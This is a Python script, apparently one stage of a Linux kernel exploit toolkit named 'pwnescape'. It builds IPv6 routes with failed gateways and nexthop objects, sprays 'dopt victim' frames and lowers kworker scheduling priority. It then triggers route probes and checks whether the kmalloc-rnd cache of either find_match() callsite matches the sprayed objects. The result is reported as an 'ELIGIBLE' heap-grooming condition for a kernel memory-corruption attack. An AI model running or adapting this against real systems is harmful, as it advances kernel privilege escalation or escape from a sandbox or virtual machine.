#!/usr/bin/env python3
# r6_host_gate2.py -- dual-callsite host gate.
#
# Linux 6.8 net/ipv6/route.c compiles find_match() twice:
#   * embedded nexthop route (f6i->nh == NULL): find_match() called directly
#   * nexthop object route  (f6i->nh != NULL): via rt6_nh_find_match()
# Each copy has its own kmalloc callsite, hence its own kmalloc-rnd-NN-64
# cache index (site E / site N).  That gives two independent per-boot chances
# to match the dopt cache.
#
# Read-only: r6obs + cacheid.py, no bpftrace, no ftrace, no kernel write.
import os, sys, time, socket, subprocess

sys.path.insert(0, "/opt/pwnescape/tools")
import r6e

T = "/opt/pwnescape/tools"
RT6 = r6e.ksym("rt6_probe_deferred")
N = int(sys.argv[1]) if len(sys.argv) > 1 else 8
G0 = int(sys.argv[2], 0) if len(sys.argv) > 2 else (0x7000 + os.getpid() % 0x100)
GW_E = G0
GW_N = G0 + 1
NHID = 20000 + (G0 & 0xffff)


def cid(addr):
    r = subprocess.run(["python3", T + "/cacheid.py", hex(addr)],
                       capture_output=True, text=True)
    p = r.stdout.split()
    return (p[0], p[1]) if len(p) >= 2 else ("?", "?")


def sh(c):
    return subprocess.run(c, shell=True, capture_output=True, text=True)


try:
    os.sched_setaffinity(0, {7})
except Exception:
    pass

# fixtures: same failed gateway, two route types, both aged 11.6 s
sh("ip -6 route del fd01:0:%x::/64 2>/dev/null" % GW_E)
sh("ip -6 route del fd01:0:%x::/64 2>/dev/null" % GW_N)
sh("ip nexthop del id %d 2>/dev/null" % NHID)
sh("ip -6 route replace fd01:0:%x::/64 via fe80::%x dev virbr-pwn" % (GW_E, GW_E))
nhr = sh("ip nexthop add id %d via fe80::%x dev virbr-pwn" % (NHID, GW_N))
if nhr.returncode != 0:
    print("nexthop add failed: %s" % nhr.stderr.strip(), flush=True)
sh("ip -6 route replace fd01:0:%x::/64 nhid %d" % (GW_N, NHID))
for g in (GW_E, GW_N):
    sh("ip -6 neigh replace fe80::%x lladdr 02:00:00:00:00:01 dev virbr-pwn nud failed" % g)
print("gate2 E=0x%x N=0x%x nhid=%d rt6=%#x" % (GW_E, GW_N, NHID, RT6), flush=True)
time.sleep(11.6)

os.system("pkill -x bpftrace 2>/dev/null; pkill -x r6obs 2>/dev/null")
time.sleep(0.2)
log = "/tmp/r6_host_gate2.log"
open(log, "w").close()
obs = subprocess.Popen([T + "/r6obs", "%x" % RT6, "20"],
                       stdout=open(log, "w"), stderr=subprocess.STDOUT)
for _ in range(60):
    if "READY" in open(log, errors="ignore").read():
        break
    time.sleep(0.1)

# dopt victims
s = r6e.sock()
base = 57000 + (int(time.time()) % 200)
for i in range(N):
    s.send(r6e.frame(base + i, 0x71000000 + i))
time.sleep(0.15)

kws = sh("ps -eLo tid,psr,comm | awk '$2==7 && /kworker/ {print $1}'").stdout.split()
for t in kws:
    sh("chrt -i -p 0 %s 2>/dev/null" % t)
s6 = socket.socket(socket.AF_INET6, socket.SOCK_RAW, 58)
s6.bind(("fd00:1::1", 0))
try:
    r6e.probe6(GW_E, s6)       # embedded-nexthop callsite
except OSError as e:
    print("probe E failed: %s" % e, flush=True)
time.sleep(0.12)
try:
    r6e.probe6(GW_N, s6)       # nexthop-object callsite
except OSError as e:
    print("probe N failed: %s" % e, flush=True)
time.sleep(0.30)
for t in kws:
    sh("chrt -o -p 0 %s 2>/dev/null" % t)
time.sleep(0.3)
obs.terminate()
try:
    obs.wait(timeout=3)
except Exception:
    obs.kill()

Q = []; E = []
for ln in open(log, errors="ignore"):
    p = ln.split()
    if not p:
        continue
    if p[0] == "QUEUE" and len(p) >= 8:
        Q.append((int(p[1], 16), int(p[2], 16), int(p[3], 16), int(p[4], 16),
                  int(p[6], 16), int(p[7])))
    elif p[0] == "ECHO" and len(p) >= 4:
        E.append((int(p[1], 16), int(p[2])))

D_IDX = D_ADDR = "?"
for (ad, sp) in E:
    obj = ad - 16
    nm, idx = cid(obj)
    if idx != "?":
        D_IDX, D_ADDR = idx, obj
        break

sites = []
for (work, pwq, data, ph, func, cpu) in Q:
    nm, idx = cid(work)
    sites.append((idx, work, pwq, data, ph, func, cpu))

sE = sites[0] if len(sites) >= 1 else None
sN = sites[1] if len(sites) >= 2 else None
hit = None
if sE and D_IDX != "?" and sE[0] == D_IDX:
    hit = "E"
elif sN and D_IDX != "?" and sN[0] == D_IDX:
    hit = "N"
verdict = "ELIGIBLE" if hit else "INELIGIBLE"

def fmt(s):
    if not s:
        return "none"
    return "%s(%s,pwq=%s,data=%s,ph=%s,func=%s,cpu=%d)" % (
        s[0], hex(s[1]), hex(s[2]), hex(s[3]), hex(s[4]), hex(s[5]), s[6])

print("HOSTGATE2 dopt=%s(%s) siteE=%s siteN=%s hit=%s verdict=%s" % (
    D_IDX, hex(D_ADDR) if D_ADDR != "?" else "?", fmt(sE), fmt(sN),
    hit or "-", verdict), flush=True)
print("bpftrace_running=%s" % bool(sh("pgrep -x bpftrace").stdout.strip()), flush=True)
